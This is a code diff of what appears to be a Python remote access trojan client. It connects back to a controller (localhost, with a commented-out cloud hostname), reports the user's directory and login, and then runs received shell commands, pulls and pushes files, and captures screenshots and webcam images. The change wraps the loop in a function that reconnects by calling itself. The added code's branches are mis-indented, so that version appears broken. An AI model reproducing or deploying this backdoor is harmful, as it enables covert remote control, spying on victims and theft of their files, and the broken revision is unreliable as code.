@@ -40,51 +40,58 @@ def get(s, filename):
         f.write(bits)
     f.close()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-port = 1234
-#s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
-s.connect(('127.0.0.1',port))
-s.send(os.getcwd().encode())
-s.send(os.getlogin().encode())
-while True:
-    res = s.recv(2048).decode()
-    res = res.lower()
-    temp = res.split(" ")
-    if temp[0] == 'cd':
-        if temp[1] == '..':
-            cwd = os.getcwd()
-            cwd = cwd.split("\\")
-            tcwd = ""
-            for i in range(len(cwd)-1):
-                tcwd += cwd[i] + "\\"
-            os.chdir(tcwd)
-            s.send((os.getcwd() + ">").encode())
-            s.send("Directory Changed...".encode())
-        else:
-            res = re.findall("cd (.+)", res)
-            os.chdir(res[0])
-            s.send((os.getcwd() + ">").encode())
-            s.send("Directory Changed...".encode())
-    elif res == "exit":
-        break
-    elif 'get*' in res or 'cat*' in res:
-        transfer(s, res.split("*")[1])
-        continue
-    elif 'upload*' in res:
-        get(s, res.split("*")[2])
-        continue
-    elif res == 'ss':
-        screenshots(s)
-        continue
-    elif res == "webcam":
-        webcam(s)
-        continue
-    else:
-        s.send((os.getcwd() + ">").encode())
-        res = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        t = res.stdout.read().decode()
-        if t == "":
-            s.send("Command Executed....".encode())
-            continue
-        s.send(t.encode())
-s.close()
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    port = 1234
+    try:
+        #s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
+        s.connect(('127.0.0.1',port))
+    except Exception as e:
+         main()
+    s.send(os.getcwd().encode())
+    s.send(os.getlogin().encode())
+    while True:
+        res = s.recv(2048).decode()
+        res = res.lower()
+        temp = res.split(" ")
+        if temp[0] == 'cd':
+            if temp[1] == '..':
+                cwd = os.getcwd()
+                cwd = cwd.split("\\")
+                tcwd = ""
+                for i in range(len(cwd)-1):
+                    tcwd += cwd[i] + "\\"
+                os.chdir(tcwd)
+                s.send((os.getcwd() + ">").encode())
+                s.send("Directory Changed...".encode())
+            else:
+                res = re.findall("cd (.+)", res)
+                os.chdir(res[0])
+                s.send((os.getcwd() + ">").encode())
+                s.send("Directory Changed...".encode())
+            elif res == "exit":
+                break
+            elif 'get*' in res or 'cat*' in res:
+                transfer(s, res.split("*")[1])
+                continue
+            elif 'upload*' in res:
+                get(s, res.split("*")[2])
+                continue
+            elif res == 'ss':
+                screenshots(s)
+                continue
+            elif res == "webcam":
+                webcam(s)
+                continue
+            else:
+                s.send((os.getcwd() + ">").encode())
+                res = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                t = res.stdout.read().decode()
+                if t == "":
+                    s.send("Command Executed....".encode())
+                    continue
+                s.send(t.encode())
+    s.close()
+
+if __name__ == '__main__':
+    main()
